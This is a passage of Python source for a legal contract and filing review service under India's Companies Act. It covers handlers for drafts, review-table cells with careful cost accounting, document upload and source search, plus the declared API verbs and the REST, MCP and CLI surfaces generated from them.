    out = {"draft_id": draft_id, "version": v.version, "format": fmt,
           "filename": f"{safe}-v{v.version}.{'docx' if fmt == 'docx' else 'txt'}",
           "ready_for_approval": v.ready, "approved": v.approved,
           "note": ("An exported draft that is not approvable says so on its own face, "
                    "because the file travels away from this system.")}
    if fmt == "text":
        out["text"] = to_text(v)
        out["content_type"] = "text/plain"
        return out
    data = to_docx(v)
    out["content_type"] = ("application/vnd.openxmlformats-officedocument."
                           "wordprocessingml.document")
    out["bytes"] = len(data)
    # base64 because a verb returns JSON. The archive itself is deterministic, so the
    # same version always encodes identically and can be hashed or cached.
    out["docx_base64"] = base64.b64encode(data).decode("ascii")
    return out


def _draft_status_verb(args: dict, ctx: Context) -> dict:
    if ctx.store is None:
        return _refuse("NO_STORE", "no store is configured")
    draft_id = (args.get("draft_id") or "").strip()
    if not draft_id:
        return _refuse("BAD_REQUEST", "draft_id is required")
    return _draft_status(ctx, draft_id)


def _cell_answerer(ctx: Context, debits: list | None = None):
    """`answer(question, kind, text) -> (value, quote) | None`, from the routed model.

    `debits` collects one `Served.step_fields()` per call -- the provider, the model, the
    region and the rupees derived from the tokens the provider REPORTED. A review table is
    the most expensive thing this product does (one call per cell, 240 for a 40x6 table),
    and until this list existed the only record of that spend was a sentence with no number
    in it.

    Raises when no model can be served, and that is deliberate: `agents/review_grid.run_cell`
    turns a raise into a FAILED cell ("this did not run"), which is the truth. Returning
    None would make it NOT_FOUND -- asserting the clause is absent from a document nobody
    read, in a table a lawyer will rely on.
    """
    from checker import router
    from checker.prompt_safety import UNTRUSTED_CLAUSE, wrap_untrusted

    def answer(question: str, kind: str, text: str):
        from checker import public_only
        origin = public_only.clear_matter(text, name="review grid cell",
                                          provider=router.AZURE)
        served, refusal = _served_or_refusal(origin, name="review_grid_cell",
                                             purpose=router.EXTRACTION, ctx=ctx,
                                             consequence=router.LOW)
        if refusal:
            raise RuntimeError(f"no model for this cell: {refusal['code']}")
        prompt = (UNTRUSTED_CLAUSE + "\n\n"
                  + f"Answer this question about the document below, as a {kind} value.\n"
                  + f"Question: {question}\n\n"
                  + "Reply with exactly two lines:\n"
                  + "VALUE: <the answer, or NONE if the document does not answer it>\n"
                  + "QUOTE: <the sentence you read it from, verbatim>\n\n"
                  + wrap_untrusted(text, "the document"))
        try:
            raw = str(served.call(prompt) or "")
        finally:
            # In a `finally`, because the call is what costs money: a reply that then
            # fails to parse, or a transport error after the provider billed us, still
            # has to be debited. A ledger that only records successful cells
            # systematically understates the bill.
            if debits is not None:
                debits.append(served.step_fields())
        return _parse_cell_reply(raw)

    return answer


def _parse_cell_reply(raw: str):
    """The two-line reply -> (value, quote), or None for an explicit NONE.

    Raises `review_grid.Unreadable` when the reply does not follow the format, and that
    distinction is the whole function: the first version set `value = ""`, found no
    `VALUE:` line, and returned None -- which `run_cell` reads as NOT_FOUND. So a model
    that replied in prose, in JSON, or with an apology made the cell assert that the clause
    is ABSENT from a document it had just described. An absence is a finding, and that one
    was manufactured here.

    Three outcomes, and `None` is reserved for the one the MODEL stated:

        VALUE: 3 years / QUOTE: ...   -> the pair
        VALUE: NONE                   -> None, because the model said so
        anything else                 -> Unreadable -> NEEDS_LAWYER

    A `VALUE:` line that is empty is Unreadable too, not NONE: a blank is not a statement
    that the document is silent, and the model had a word for that.
    """
    from agents.review_grid import Unreadable
    value = quote = ""
    saw_value = False
    for line in (raw or "").splitlines():
        if line.upper().startswith("VALUE:"):
            saw_value = True
            value = line.split(":", 1)[1].strip()
        elif line.upper().startswith("QUOTE:"):
            quote = line.split(":", 1)[1].strip()
    if not saw_value:
        raise Unreadable(
            f"no VALUE: line in a {len(raw or '')}-character reply, so nothing was read "
            f"from it. This is NOT an absence: the reply began "
            f"{(raw or '').strip()[:80]!r}")
    if not value:
        raise Unreadable(
            "the VALUE: line was empty. A blank is not a statement that the document is "
            "silent -- the format has NONE for that -- so it is not recorded as one")
    if value.upper() == "NONE":
        return None
    return (value, quote)


def _cell_debit(debits: list, *, stubbed: bool) -> dict:
    """{provider, cost_inr, cost_note} for one cell. NEVER a zero standing in for unknown.

    Three ways a cell has no number, and they are different facts, so they get different
    notes rather than one 0.00:

        a priced call      the rupees from `Served.step_fields()`
        a call we cannot price   NULL, and the note begins "UNPRICED:"
        no billed call at all   NULL, and the note says which: a stub answerer, or a cell
                                that returned before anything was sent (an unreadable
                                document, no text held)

    `review_table.status` sums only the first kind and says how many of the others there
    were, because a total that silently included them would be a smaller number presented
    as the bill.
    """
    if debits:
        f = debits[-1]
        return {"provider": f.get("provider"), "cost_inr": f.get("cost_inr"),
                "cost_note": f.get("cost_note")}
    if stubbed:
        return {"provider": None, "cost_inr": None,
                "cost_note": ("no billed call was made: a caller-supplied answerer served "
                              "this cell. This is not a cost of zero.")}
    return {"provider": None, "cost_inr": None,
            "cost_note": ("no model was called for this cell -- it returned before "
                          "anything was sent. This is not a cost of zero.")}


def _grid_spend(rows) -> dict:
    """The grid's running total, and what the total does NOT include.

    A single number would have to choose what to do with the cells that ran and could not
    be priced, and both choices are wrong: dropping them makes the total read as the bill,
    and counting them as 0.00 claims those calls were free. So the total is the PRICED
    cells only, it is labelled a lower bound whenever anything else ran, and the counts
    that make it one are beside it.
    """
    priced = [float(r["cost_inr"]) for r in rows if r.get("cost_inr") is not None]
    ran = [r for r in rows if str(r.get("state") or "") != "PENDING"]
    unpriced = [r for r in ran if r.get("cost_inr") is None]
    pending = [r for r in rows if str(r.get("state") or "") == "PENDING"]
    total = round(sum(priced), 4) if priced else None
    if total is None:
        note = (f"UNPRICED: not one of this table's {len(rows)} cells carries a price, so "
                f"there is no total. {len(ran)} cell(s) have run. A zero here would claim "
                f"the work was free.")
    elif unpriced or pending:
        note = (f"At least Rs.{total:.4f}, over {len(priced)} priced cell(s). "
                f"{len(unpriced)} cell(s) ran and could not be priced and "
                f"{len(pending)} have not run, so the true figure is HIGHER. This is a "
                f"lower bound, not the bill.")
    else:
        note = (f"Rs.{total:.4f} over all {len(priced)} cells, every one priced from the "
                f"tokens the provider reported.")
    return {"total_inr": total, "priced_cells": len(priced),
            "unpriced_cells": len(unpriced), "pending_cells": len(pending),
            "is_lower_bound": total is not None and bool(unpriced or pending),
            "note": note}


def _review_grid_cell(args: dict, ctx: Context) -> dict:
    """Answer ONE cell and write it. The queue handler for `review_grid_cell`.

    Writes through `write_grid_cell(if_pending=True)`, so a worker handed the same cell
    twice after a crash does not overwrite the answer the first attempt gave. The write
    returning False is reported, not swallowed: it is the exactly-once guard firing.
    """
    from agents import review_grid as rgr

    if ctx.store is None:
        return {"status": "FAILED", "error": "a grid cell needs the store to write to"}
    answer = (ctx.model_for(()) if ctx.model_for is not None else None)
    stubbed = answer is not None
    debits: list = []
    if answer is None:
        answer = _cell_answerer(ctx, debits)
    try:
        cell = rgr.run_cell(args, documents=ctx.documents, answer=answer)
    except rgr.RunnerError as e:
        return {"status": "FAILED", "error": str(e)}
    debit = _cell_debit(debits, stubbed=stubbed)
    wrote = ctx.store.write_grid_cell(
        {"grid_id": args["grid_id"], "document_id": cell.document_id,
         "column_name": cell.column, "state": cell.state, "value": cell.value,
         "quote": cell.quote, "reason": cell.reason,
         "provider": debit["provider"], "cost_inr": debit["cost_inr"],
         "cost_note": debit["cost_note"]})
    # The ledger `run_steps` has been since 003, with the same numbers. A cell is a run, so
    # this is one step per cell and the two records cannot disagree: they are built from
    # one `Served.step_fields()`.
    ctx.last_steps.append({
        "capability": "review_grid.cell",
        "status": "FAILED" if cell.state == "FAILED" else "ANSWERED",
        **debit})
    return {"status": "ANSWERED" if wrote else "ANSWERED",
            "grid_id": args["grid_id"], "document_id": cell.document_id,
            "column": cell.column, "cell_state": cell.state,
            "written": wrote, "cost_inr": debit["cost_inr"],
            "cost_note": debit["cost_note"],
            "note": (None if wrote else
                     "this cell was already answered; the earlier answer was kept. A "
                     "worker handed the same cell twice does not overwrite it.")}


def _review_table_cancel(args: dict, ctx: Context) -> dict:
    """Stop scheduling. Deletes nothing. A WRITE verb, so it is off MCP.

    The compensation for "you changed your mind at cell 30 of 40" is to stop, not to undo
    29 answers that were correct and paid for (PLAN_23 §1.9). Cells already answered stay
    exactly as they are; cells not yet run stay PENDING, not FAILED -- nothing went wrong,
    and FAILED would put transport language on a decision the user made.
    """
    if ctx.store is None:
        return _refuse("NO_STORE", "no store is configured")
    grid_id = (args.get("grid_id") or "").strip()
    if not grid_id:
        return _refuse("BAD_REQUEST", "grid_id is required")
    table, already = _load_grid(ctx, grid_id)
    if table is None:
        return _refuse("NOT_FOUND", f"no review table {grid_id!r} for this tenant")
    if already:
        return _refuse("ALREADY_CANCELLED",
                       f"review table {grid_id} was already cancelled; cancelling twice "
                       f"is not an error worth hiding, but it changed nothing")
    ctx.store.cancel_grid(grid_id)
    t = table.tally()
    return {"grid_id": grid_id, "cancelled": True,
            "findings_kept": t["findings"], "pending_stopped": t["PENDING"],
            "cells": t["cells"],
            "note": (f"{t['findings']} answered cell(s) are KEPT and {t['PENDING']} "
                     f"unrun cell(s) stay PENDING. Cancelling stops scheduling; it does "
                     f"not undo work that was done, and it does not mark unrun cells as "
                     f"failed.")}


def _documents_upload(args: dict, ctx: Context) -> dict:
    """Store bytes under their own sha256. The identity IS the hash, not a counter.

    `cannot_read` records a file whose text could NOT be extracted -- a scan, a
    photographed page -- with the reason. Without it such a file could only be left out of
    the upload, and then the conversation's file panel would not show the document the user
    attached at all: "we could not read your scan" would render as silence, which is the
    failure `checker/pdf_pages` exists to refuse, one layer out. Text is not required in
    that case, because there is none; everything else about the file is.

    Extraction itself is not done here. `checker/pdf_pages` is offline tooling whose own
    test asserts the served path imports no PDF reader, so the caller extracts and this
    verb records what happened.
    """
    import hashlib
    text = args.get("text") or ""
    cannot = (args.get("cannot_read") or "").strip()
    if not text.strip() and not cannot:
        return _refuse("BAD_REQUEST",
                       "text is required, or cannot_read with the reason it could not be "
                       "extracted")
    if cannot and len(cannot) < 20:
        return _refuse("BAD_REQUEST",
                       f"cannot_read must say WHY in words, got {cannot!r}. A file shown "
                       f"as unreadable with no reason invites the reader to assume the "
                       f"document was empty")
    name = args.get("name") or "document"
    seed = text if text.strip() else f"{name}\u0000{cannot}"
    digest = hashlib.sha256(seed.encode("utf-8")).hexdigest()
    ctx.documents[digest] = {"sha256": digest, "bytes": len(text.encode("utf-8")),
                             "name": name, "tenant": ctx.tenant}
    if cannot:
        ctx.documents[digest]["cannot_read"] = cannot
    return {"document_id": digest, "sha256": digest,
            "bytes": ctx.documents[digest]["bytes"],
            "state": ("CANNOT_READ" if cannot else "READ"),
            "reason": cannot or None,
            "stored": "memory",
            "note": ("held in this process only. gateway/migrations/*.sql are not "
                     "applied, so nothing here survives a restart and no database "
                     "enforces tenant isolation.")}


def _sources_list(args: dict, ctx: Context) -> dict:
    """Every source, its tier, and whether it may be fetched — with the reason when not.

    The reason travels with the refusal on purpose. "no" on its own invites someone to try
    again with a different client; "robots: https://www.rbi.org.in BLOCKED HTTP 418" does
    not, and it is also the answer to "why has nobody built the RBI connector".
    """
    from checker.sources import terms
    from checker.sources.tiers import CLIENT, HELD, TIERS

    out = []
    for source_id in terms.SOURCE_IDS:
        rec = terms.record_for(source_id)
        fetch_ok, fetch_why = terms.may_fetch(source_id)
        cache_ok, cache_why = terms.may_cache(source_id)
        out.append({
            "source_id": source_id,
            "name": rec.name,
            "terms_url": rec.terms_url,
            "terms_read": rec.date_read or None,
            "robots": [{"origin": o.origin, "state": o.state, "http": o.http}
                       for o in rec.robots],
            "may_fetch": fetch_ok, "may_fetch_reason": fetch_why,
            "may_cache": cache_ok, "may_cache_reason": cache_why,
            "clauses": {c.topic: c.state for c in rec.clauses},
        })
    # The two adapters that exist. Neither needs a terms record and both say why.
    built_in = [{"source_id": "held", "name": "Companies Act 2013 (our corpus)",
                 "tier": HELD, "may_fetch": True,
                 "may_fetch_reason": "ours, hash-stamped; the only tier that can VERIFY"},
                {"source_id": "client", "name": "Your uploaded documents", "tier": CLIENT,
                 "may_fetch": True,
                 "may_fetch_reason": "the tenant's own document, under review"}]
    return {"tiers": list(TIERS), "adapters": built_in, "external": out,
            "fetchable": [r["source_id"] for r in out if r["may_fetch"]],
            "cacheable": [r["source_id"] for r in out if r["may_cache"]],
            "note": ("Only HELD can make an answer VERIFIED (PLAN_26 §2). External sources "
                     "are listed with what their own terms permit, read on the date shown; "
                     "an unread term is OPEN, and OPEN is not permission.")}


def _sources_search(args: dict, ctx: Context) -> dict:
    """Search the loadable sources and return Evidence rows, each carrying its tier.

    Today that is HELD and CLIENT. The five external sources S0 recorded either refuse us
    by robots or have unread terms, so there is nothing to call — and this returns the
    empty list with the reasons rather than pretending the sources do not exist.
    """
    from checker.sources.base import load
    from checker.sources.client import ClientDocuments
    from checker.sources.evidence import verifying
    from checker.sources.held import AsOfUnsupported, HeldCorpus
    from checker.sources.tiers import label_for

    query = (args.get("query") or "").strip()
    if not query:
        return _refuse("BAD_REQUEST", "query is required")
    wanted = args.get("tiers") or None
    as_of = (args.get("as_of") or "").strip() or None

    rows, refusals = [], []
    for src in (HeldCorpus(), ClientDocuments(ctx.documents)):
        if wanted and src.tier not in wanted:
            continue
        try:
            rows.extend(load(src).search(query, as_of=as_of))
        except AsOfUnsupported as exc:
            # A named refusal, not a silent fallback to current text. CLAUDE.md:
            # point-in-time reconstruction is UNVERIFIED against any external source.
            return _refuse("AS_OF_UNSUPPORTED", str(exc))
        except Exception as exc:                      # a connector that cannot load
            refusals.append({"source_id": getattr(src, "source_id", "?"),
                             "detail": str(exc)})
    from checker.sources import terms
    for source_id in terms.SOURCE_IDS:
        ok, why = terms.may_fetch(source_id)
        if not ok:
            refusals.append({"source_id": source_id, "detail": why})

    return {
        "query": query,
        "results": [{"tier": e.tier, "source": e.source, "ref": e.ref,
                     "fetched_at": e.fetched_at, "sha256": e.sha256,
                     "quoted_span": e.quoted_span, "attribution": e.attribution,
                     "label": label_for(e.tier, date=e.fetched_at[:10], source=e.source),
                     "can_verify": e.can_verify} for e in rows],
        "verified_count": len(verifying(rows)),
        "not_searched": refusals,
        "note": ("Every row carries its tier. Only a HELD row may support a legal claim; "
                 "`not_searched` says which sources were not asked and why."),
    }


# ── the table ────────────────────────────────────────────────────────────────

VERBS: tuple[Verb, ...] = (
    Verb("ask", "One grounded research question against the held statute. Cited spans or "
                "a named refusal.",
         (Field("question", STRING, True, describes="the question, in plain English"),
          Field("available", ARRAY, False, describes="provider tuple to route over"),
          Field("company_facts", ARRAY, False,
                describes="company facts you are telling us, e.g. "
                          "[{'field':'listed','value':'yes'}]. Labelled 'you told us', "
                          "shown back, never verified, and they do not steer the answer"),
          Field("critic", STRING, False,
                describes="'true' to run the layer-7 critic over the answer's own "
                          "sentences after the verifier. It may FLAG or REMOVE only, at "
                          "most one removal per run (PLAN_23 §1.4), and never rewrites or "
                          "adds. Every removal is in critic.trace"),
          Field("decompose", STRING, False,
                describes="'true' to split a compound question into at most 4 "
                          "sub-questions (PLAN_23 O5), answer each through the verified "
                          "cascade and join only the parts that came back cited. One "
                          "unanswered part makes the whole PARTIAL and is named")),
         "POST", read_only=True, run=_ask),

    Verb("review_contract",
         "A contract against a company playbook. Every finding is a POTENTIAL_ISSUE "
         "against that standard, never a statement of law.",
         (Field("text", STRING, True, describes="the contract text"),
          Field("name", STRING, False, describes="a label for the document"),
          Field("playbook", STRING, False, describes="repo-relative playbook path"),
          Field("test_data", STRING, False,
                describes="set when the document is a fixture or specimen, not a client "
                          "contract. Required to send one while the deployment region is "
                          "unconfirmed (PLAN_22 D3)")),
         "POST", read_only=True, run=_review_contract),

    Verb("runs.get", "One run's status and result, without its steps.",
         (Field("run_id", STRING, True, in_path=True, describes="the run identifier"),),
         "GET", read_only=True, run=_runs_get),

    Verb("runs.trace", "Every step of one run, in order, as persisted.",
         (Field("run_id", STRING, True, in_path=True, describes="the run identifier"),),
         "GET", read_only=True, run=_runs_trace),

    Verb("review_document",
         "A corporate filing against the SS-1/SS-2 checks. The document type is classified "
         "first, in code, and a check that does not apply to that type makes no claim. No "
         "model is called.",
         (Field("text", STRING, True, describes="the document text"),
          Field("name", STRING, False, describes="a label for the document"),
          Field("meeting_kind", STRING, False,
                describes="board or general. Recorded on the run; no check branches on it "
                          "today"),
          Field("meeting_date", STRING, False,
                describes="YYYY-MM-DD. Absent leaves the 30-day entry check unverifiable "
                          "rather than passed"),
          Field("entry_date", STRING, False,
                describes="YYYY-MM-DD, the date the minutes were entered in the book")),
         "POST", read_only=True, run=_review_document),

    Verb("runs.approve",
         "Accept one finding of a run, with a written reason. Stored as labelled data.",
         (Field("run_id", STRING, True, in_path=True, describes="the run identifier"),
          Field("item_ref", STRING, True,
                describes="which finding, as the run served it: 'ss:T1.2', "
                          "'playbook:NDA-08'"),
          Field("reason", STRING, True,
                describes="why, in the reviewer's own words. At least 10 characters: a "
                          "decision with no reason is not a label"),
          Field("quoted_span", STRING, True,
                describes="the text the reviewer was looking at when they decided"),
          Field("quote_viewed", BOOLEAN, False,
                describes="true when the reviewer was shown the quoted text. Required to "
                          "approve (PLAN_23 §1.8); a rejection records it either way")),
         "POST", read_only=False, run=_runs_approve),

    Verb("runs.reject",
         "Reject one finding of a run, with a written reason. Stored as labelled data.",
         (Field("run_id", STRING, True, in_path=True, describes="the run identifier"),
          Field("item_ref", STRING, True,
                describes="which finding, as the run served it: 'ss:T1.2', "
                          "'playbook:NDA-08'"),
          Field("reason", STRING, True,
                describes="why, in the reviewer's own words. At least 10 characters: a "
                          "decision with no reason is not a label"),
          Field("quoted_span", STRING, True,
                describes="the text the reviewer was looking at when they decided"),
          Field("quote_viewed", BOOLEAN, False,
                describes="true when the reviewer was shown the quoted text. Required to "
                          "approve (PLAN_23 §1.8); a rejection records it either way")),
         "POST", read_only=False, run=_runs_reject),

    Verb("runs.submit",
         "Accept a run and return its id immediately. A worker executes it from the "
         "durable queue; the status moves PLANNED -> RUNNING -> final.",
         (Field("intent", STRING, True,
                describes="which intent to run: review_document, review_contract or "
                          "research_question"),
          Field("args", OBJECT, False,
                describes="the arguments that intent's synchronous verb takes")),
         "POST", read_only=False, run=_runs_submit),

    Verb("runs.cancel",
         "Ask a running run to stop at its next step boundary. What is already done stays "
         "in the trace.",
         (Field("run_id", STRING, True, in_path=True, describes="the run identifier"),),
         "POST", read_only=False, run=_runs_cancel),

    Verb("events.assess",
         "Which bodies of law a corporate event engages, and what can be said about each: "
         "the obligation engine for a held body, current text for a current-only body, and "
         "the named refusal for one this corpus does not hold.",
         (Field("event", STRING, True,
                describes="the event key, e.g. share_allotment, related_party_contract"),
          Field("facts", OBJECT, False,
                describes="foreign_investor, listed, state — facts that add bodies"),
          Field("company_facts", ARRAY, False,
                describes="company facts with their basis: typed by you (USER_FACT) or "
                          "read from an MCA master-data page you uploaded (COMPANY_FACT, "
                          "with the quoted span). ONLY THE CONFIRMED ONES ARE USED")),
         "POST", read_only=True, run=_events_assess),

    Verb("sources.list",
         "Every source, its tier, and whether its own terms and robots.txt permit a fetch "
         "-- with the reason when they do not.",
         (),
         "POST", read_only=True, run=_sources_list),

    Verb("sources.search",
         "Search every source that may be read, returning Evidence rows that each carry "
         "their tier. Only a HELD row may support a legal claim.",
         (Field("query", STRING, True, describes="what to look for"),
          Field("tiers", ARRAY, False,
                describes="restrict to these tiers, e.g. ['HELD']. Absent searches all "
                          "loadable sources"),
          Field("as_of", STRING, False,
                describes="YYYY-MM-DD. REFUSED for HELD: point-in-time reconstruction is "
                          "UNVERIFIED against any external source, so a past date gets a "
                          "named refusal rather than today's text")),
         "POST", read_only=True, run=_sources_search),

    Verb("company_facts.extract",
         "Read an MCA Company Master Data page you downloaded from mca.gov.in and "
         "uploaded. Every field comes back with the span it was read from, unconfirmed. "
         "Director names and DINs are not read, not stored and not returned.",
         (Field("text", STRING, True,
                describes="the page's text. A scan has no text layer and is refused as "
                          "CANNOT_READ, never as an empty set of facts"),
          Field("uploaded_on", STRING, True,
                describes="YYYY-MM-DD, the date you uploaded it. It is part of the "
                          "source label every fact carries")),
         "POST", read_only=True, run=_company_facts_extract),

    Verb("intake.classify",
         "Which of six fixed tasks a request is, with two alternatives and a reason -- or "
         "a one-sentence question when it is genuinely open. Decided by code wherever code "
         "can; a model is asked only when the rules cannot, and its reply must be one of "
         "the six names. This verb never runs the task.",
         (Field("message", STRING, False,
                describes="the user's words. Rendered verbatim, never parsed for meaning "
                          "beyond the fixed signals"),
          Field("files", ARRAY, False,
                describes="the attachments as [{name, type}]. The NAME decides whether a "
                          "file is a contract or a filing, because a .pdf is both"),
          Field("facts", OBJECT, False,
                describes="event facts (foreign_investor, listed, state). Recorded and "
                          "passed through, never used to classify: they describe the "
                          "company, not what is being asked")),
         "POST", read_only=True, run=_intake_classify),

    Verb("conversation.send",
         "One turn of a conversation: classify the request, dispatch it to the verb that "
         "answers it, store the message, and return the answer envelope -- or a run_id at "
         "once when the work belongs on the queue.",
         (Field("conversation_id", STRING, False,
                describes="the thread to append to. Absent starts a new one"),
          Field("text", STRING, False, describes="the user's words"),
          Field("file_ids", ARRAY, False,
                describes="sha256 ids from documents.upload"),
          Field("as_of", STRING, False,
                describes="YYYY-MM-DD, the date to read the law as at. Defaults to today"),
          Field("sources", ARRAY, False,
                describes="source ids to consult, from sources.list. Recorded; only HELD "
                          "and CLIENT are loadable today"),
          Field("task_override", STRING, False,
                describes="name the task yourself instead of letting intake classify it"),
          Field("event", STRING, False,
                describes="the event key, when the task is EVENT_ASSESS"),
          Field("facts", OBJECT, False, describes="event facts"),
          Field("test_data", STRING, False,
                describes="set when a contract is a fixture, not a client document "
                          "(PLAN_22 D3)"),
          Field("prose", ARRAY, False,
                describes="connecting sentences for a DRAFT, as [{text, citation_ids}]. "
                          "Each is stored as a MODEL_SUGGESTION and blocks approval; one "
                          "that states something about the law without a citation this "
                          "run holds is DROPPED and reported in dropped_claims")),
         "POST", read_only=False, run=_conversation_send),

    Verb("conversation.list", "Every conversation for this tenant, newest first.",
         (Field("limit", STRING, False, describes="how many, up to 200"),),
         "POST", read_only=True, run=_conversation_list),

    Verb("conversation.get", "One conversation and its messages, in order.",
         (Field("conversation_id", STRING, True, in_path=True,
                describes="the thread"),),
         "GET", read_only=True, run=_conversation_get),

    Verb("citation.get",
         "One citation in full for the source panel, with its quote RE-VERIFIED against "
         "the held corpus rather than trusted from the stored envelope.",
         (Field("citation_id", STRING, True, describes="the citation's id"),
          Field("conversation_id", STRING, True,
                describes="the thread it was cited in, so the tenant's own policy governs "
                          "the read")),
         "POST", read_only=True, run=_citation_get),

    Verb("review_table.create",
         "Define a review table -- documents down the side, questions across the top -- "
         "and queue one job per cell. Refuses above the cell cap, and checks the budget "
         "before anything is enqueued.",
         (Field("name", STRING, True, describes="a name for the table"),
          Field("document_ids", ARRAY, True,
                describes="sha256 ids from documents.upload"),
          Field("columns", ARRAY, True,
                describes="[{name, kind, question}]; kind is text|date|amount|yes_no|"
                          "clause, and question is what is asked of each document"),
          Field("grid_id", STRING, False,
                describes="supply one to make creation idempotent")),
         "POST", read_only=False, run=_review_table_create),

    Verb("review_table.status",
         "One review table: per-state counts, every cell, and whether it is complete. "
         "PENDING and COULD NOT RUN are not findings.",
         (Field("grid_id", STRING, True, describes="the table"),),
         "POST", read_only=True, run=_review_table_status),

    Verb("review_table.export",
         "The table as CSV. Every cell carries words rather than a blank, and any value a "
         "spreadsheet would run as a formula is quoted.",
         (Field("grid_id", STRING, True, describes="the table"),),
         "POST", read_only=True, run=_review_table_export),

    Verb("draft.create",
         "Start a draft at version 1. A MODEL_SUGGESTION or UNKNOWN slot blocks approval.",
         (Field("title", STRING, True, describes="the document's title"),
          Field("body", STRING, False, describes="the rendered text"),
          Field("slots", ARRAY, False,
                describes="[{name, value, type, source?, working?}]; type is "
                          "SOURCE_QUOTE|USER_FACT|DERIVED_FACT|TEMPLATE_TEXT|"
                          "MODEL_SUGGESTION|UNKNOWN"),
          Field("citations", ARRAY, False, describes="the legal basis, as strings"),
          Field("kind", STRING, False, describes="the template, e.g. agm_notice"),
          Field("draft_id", STRING, False, describes="supply one to make it idempotent")),
         "POST", read_only=False, run=_draft_create),

    Verb("draft.revise",
         "Save a NEW version of a draft; never edits one. Pass approved_by to approve, "
         "which is refused while any slot is unsupported.",
         (Field("draft_id", STRING, True, describes="the draft"),
          Field("title", STRING, False, describes="a new title; absent keeps the last"),
          Field("body", STRING, False, describes="new text; absent keeps the last"),
          Field("slots", ARRAY, False, describes="new slots; absent keeps the last"),
          Field("citations", ARRAY, False, describes="new citations"),
          Field("approved_by", STRING, False,
                describes="the reviewer's name. Refused while anything blocks approval")),
         "POST", read_only=False, run=_draft_revise),

    Verb("draft.status", "One draft: its version count, whether it is approvable, and "
                         "which slots block it.",
         (Field("draft_id", STRING, True, describes="the draft"),),
         "POST", read_only=True, run=_draft_status_verb),

    Verb("draft.versions", "Every version of a draft, in order, with its provenance.",
         (Field("draft_id", STRING, True, describes="the draft"),),
         "POST", read_only=True, run=_draft_versions),

    Verb("draft.diff",
         "The exact diff between two versions: a unified text diff, and the provenance "
         "changes a text diff cannot show.",
         (Field("draft_id", STRING, True, describes="the draft"),
          Field("from_version", STRING, False, describes="default 1"),
          Field("to_version", STRING, False, describes="default the latest")),
         "POST", read_only=True, run=_draft_diff),

    Verb("draft.export",
         "One version as .docx or text. The .docx is written with the standard library; "
         "an unapprovable draft says so on its own face.",
         (Field("draft_id", STRING, True, describes="the draft"),
          Field("version", STRING, False, describes="default the latest"),
          Field("format", STRING, False, describes="docx (default) or text")),
         "POST", read_only=True, run=_draft_export),

    Verb("review_table.cancel",
         "Stop scheduling a review table's remaining cells. Answered cells are kept; "
         "unrun cells stay PENDING, not failed.",
         (Field("grid_id", STRING, True, describes="the table"),),
         "POST", read_only=False, run=_review_table_cancel),

    Verb("documents.upload",
         "Store a document and return the sha256 that identifies it.",
         (Field("text", STRING, False, describes="the document text"),
          Field("name", STRING, False, describes="a label for the document"),
          Field("cannot_read", STRING, False,
                describes="the reason the text could NOT be extracted, for a scan or a "
                          "photographed page. Recorded so the file panel shows the "
                          "document with CANNOT_READ instead of omitting it")),
         "POST", read_only=False, run=_documents_upload),
)


def by_name() -> dict[str, Verb]:
    return {v.name: v for v in VERBS}


# ── the three surfaces, generated ────────────────────────────────────────────

def rest_spec(verbs: tuple[Verb, ...] | None = None) -> dict[str, dict]:
    """{verb name: {method, path, body, path_params}}.

    `verbs` is a parameter so the parity test can generate the surfaces for a HYPOTHETICAL
    table without mutating this module -- a test that rebinds a global to prove something
    leaves the next test reading whatever it left behind.
    """
    return {v.name: {"method": v.method, "path": rest_path(v),
                     "body": tuple(f.name for f in v.body_fields),
                     "required": tuple(f.name for f in v.inputs if f.required),
                     "path_params": tuple(f.name for f in v.path_fields)}
            for v in (VERBS if verbs is None else verbs)}


def mcp_tools(verbs: tuple[Verb, ...] | None = None) -> tuple:
    """The existing Tool type, so these join checker/mcp/ rather than shadow it.

    A verb that is not read_only is REFUSED here rather than quietly exported: the MCP
    policy asserts every known tool is read-only, and widening that is a decision, not a
    side effect of adding a verb.
    """
    from checker.mcp.tools import Tool, _obj
    out = []
    for v in (VERBS if verbs is None else verbs):
        if not v.read_only:
            continue
        props = {f.name: {"type": f.kind, "description": f.describes} for f in v.inputs}
        required = tuple(f.name for f in v.inputs if f.required)
        out.append(Tool(mcp_name(v), v.summary, _obj(props, required),
                        (lambda verb: lambda args: (verb.run or (lambda a, c: {}))(
                            args, Context()))(v)))
    return tuple(out)


def cli_spec(verbs: tuple[Verb, ...] | None = None) -> dict[str, dict]:
    """{verb name: {command, flags: {flag: required}}}."""
    return {v.name: {"command": cli_command(v),
                     "flags": {cli_flag(f): f.required for f in v.inputs},
                     "summary": v.summary}
            for v in (VERBS if verbs is None else verbs)}


def write_verbs(verbs: tuple[Verb, ...] | None = None) -> tuple[str, ...]:
    """Verbs that change state. Named once, so three surfaces cannot disagree about it."""
    return tuple(v.name for v in (VERBS if verbs is None else verbs)
                 if not v.read_only)


def _test() -> None:
    ok = fail = 0

    def check(cond: bool, label: str) -> None:
        nonlocal ok, fail
        if cond:
            ok += 1
            print(f"  [PASS] {label}")
        else:
            fail += 1
            print(f"  [FAIL] {label}")

    rest, cli, mcp = rest_spec(), cli_spec(), mcp_tools()
    names = {v.name for v in VERBS}

    check(names == {"ask", "review_contract", "review_document", "events.assess",
                    "runs.get", "runs.trace", "runs.approve", "runs.reject",
                    "runs.submit", "runs.cancel", "documents.upload",
                    "sources.list", "sources.search", "company_facts.extract",
                    "intake.classify", "conversation.send", "conversation.list",
                    "conversation.get", "citation.get", "review_table.create",
                    "review_table.status", "review_table.export",
                    "review_table.cancel", "draft.create",
                    "draft.revise", "draft.status", "draft.versions", "draft.diff",
                    "draft.export"},
          f"the twenty-nine verbs are declared once ({sorted(names)})")
    # sources.* are READ-ONLY, so they reach MCP. That is the intended shape: an agent may
    # ask what a source permits and search what may be read, and there is no sources verb
    # that fetches, stores or spends. S3's Indian Kanoon connector will spend money, and
    # will be a separate verb argued for separately.
    check({f"{MCP_NAMESPACE}.sources.list", f"{MCP_NAMESPACE}.sources.search"}
          <= {t.name for t in mcp},
          "...and both sources verbs reach MCP, being read-only")
    # Every verb that WRITES, named rather than counted, so adding one is a deliberate edit
    # to this line. All five are kept out of MCP by mcp_tools() for the same reason: a tool
    # surface that can submit, cancel or approve is one that can act with nobody present.
    check(set(write_verbs()) == {"documents.upload", "runs.approve", "runs.reject",
                                 "runs.submit", "runs.cancel", "conversation.send",
                                 "review_table.create", "review_table.cancel",
                                 "draft.create", "draft.revise"},
          f"...and exactly ten of them write ({sorted(write_verbs())})")
    check(f"{MCP_NAMESPACE}.conversation.send" not in {t.name for t in mcp},
